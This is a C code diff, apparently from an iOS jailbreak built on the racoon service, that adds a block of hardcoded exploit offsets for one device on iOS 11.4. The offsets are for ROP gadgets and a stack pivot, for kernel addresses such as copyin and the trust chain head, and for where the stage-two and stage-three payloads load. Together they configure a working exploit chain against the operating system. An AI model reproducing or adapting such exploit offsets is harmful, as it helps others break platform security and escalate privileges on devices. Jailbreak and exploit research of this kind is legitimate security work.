@@ -15,7 +15,60 @@
 int install(const char *config_path, const char *racoon_path, const char *dyld_cache_path)
 {
 
-#define N69AP_11_3
+#define N69AP_11_4
+#ifdef N69AP_11_4
+    jake_img_t kernel_symbols; // dummy
+    offset_struct_t myoffsets;
+    // adr @ 0x100067c10
+    // ldr @ 0x1000670e0
+    myoffsets.dns4_array_to_lcconf = -((0x100067c10+0x28-4*8)-0x1000670e0);
+    myoffsets.lcconf_counter_offset = 0x10c;
+    myoffsets.memmove = 0x1ab7b0d50;
+    myoffsets.longjmp = realsym(dyld_cache_path,"__longjmp");
+    myoffsets.stack_pivot = 0x180b12714;
+    myoffsets.mmap = realsym(dyld_cache_path,"___mmap");
+    myoffsets.memcpy = realsym(dyld_cache_path,"_memcpy");
+    myoffsets.open = realsym(dyld_cache_path,"_open");
+    myoffsets.max_slide = 0x0000000004678000;
+    myoffsets.slide_value = 0x4000;
+    myoffsets.pivot_x21 = 0x199c4b93c
+    myoffsets.pivot_x21_x9_offset = 0x50-0x38; // VERIFY
+    myoffsets.str_buff_offset = 8; // VERIFY
+    myoffsets.BEAST_GADGET = 0x1a16e6494;
+    myoffsets.BEAST_GADGET_LOADER = myoffsets.BEAST_GADGET+4*9; // VERIFY
+    myoffsets.BEAST_GADGET_CALL_ONLY = myoffsets.BEAST_GADGET+4*8; // VERIFY
+    myoffsets.str_x0_gadget = 0x197e1eac8;
+    myoffsets.str_x0_gadget_offset = 0x28; // VERIFY
+    myoffsets.cbz_x0_gadget = 0x188d340bc;
+    myoffsets.cbz_x0_x16_load = 0x1b1d72000+0x4c8;
+    myoffsets.add_x0_gadget = 0x18519cb90;
+    myoffsets.fcntl_raw_syscall = realsym(dyld_cache_path,"___fcntl");
+    myoffsets.raw_mach_vm_remap_call = realsym(dyld_cache_path,"_mach_vm_remap");
+    myoffsets.rop_nop = myoffsets.BEAST_GADGET+4*17;
+    myoffsets.new_cache_addr = 0x1c0000000;
+    myoffsets.cache_text_seg_size = 0x30000000;
+    myoffsets.errno_offset = 0x1b3263000+0xff8+(0x1c0000000-0x180000000);
+    myoffsets.mach_msg_offset = 0x1f1896018; // TODO: will find this one through dynamic ana I guess?
+    myoffsets.stage2_base = myoffsets.new_cache_addr+myoffsets.cache_text_seg_size+0x4000;
+    myoffsets.stage2_max_size = 0x200000;
+    myoffsets.thread_max_size = 0x10000;
+    myoffsets.ipr_size = 8;
+    myoffsets.rootdomainUC_vtab = 0xfffffff00708e158;
+    myoffsets.itk_registered = 0x2f0;
+    myoffsets.is_task = 0x28;
+    myoffsets.copyin = 0xFFFFFFF0071A71CC;
+    myoffsets.gadget_add_x0_x0_ret = 0xFFFFFFF0073C9C58;
+    myoffsets.swapprefix_addr = 0xfffffff0075ad8cc;
+    myoffsets.trust_chain_head_ptr = 0xFFFFFFF0076B0EE8;
+    myoffsets.stage3_fileoffset = 0;
+    myoffsets.stage3_loadaddr = myoffsets.new_cache_addr-0x100000;
+    myoffsets.stage3_size = 0x10000;
+    // YOU NEED TO UPDATE THOSE WHEN YOU RECOMPILE STAGE 3 (you also need to update the hashes in stage2.c so watch out for that)
+    myoffsets.stage3_jumpaddr = myoffsets.stage3_loadaddr + 0x6574;
+    myoffsets.stage3_CS_blob = 49744;
+    myoffsets.stage3_CS_blob_size = 624;
+#endif
+//#define N69AP_11_3
 #ifdef N69AP_11_3
     jake_img_t kernel_symbols; // dummy
 	offset_struct_t myoffsets;
@@ -67,7 +120,8 @@ int install(const char *config_path, const char *racoon_path, const char *dyld_c
     myoffsets.stage3_jumpaddr = myoffsets.stage3_loadaddr + 0x6574; // nm of the function we want to jump to
     myoffsets.stage3_CS_blob = 49744; // jtool --sig shows that info and I think we can get it when parsing the header
     myoffsets.stage3_CS_blob_size = 624; // same for this one
-#else
+#endif
+#if 0
 	// this basically just initalizes the myoffsets structure. THis is the only part that prevent the jailbreak from working on all devices/versions because the offsetfinders (I think mainly the kernel one) is still broken
 	// so in theory you could also remove all the offsetfinders and just get the symbols by hand
 	// For examples on how they look like, just look at the git history at some point there were no offsetfinders and all of this was hardcoded for a specific device (either ipad mini gen 4 wifi iOS 11.1.2 or 11.3.1)
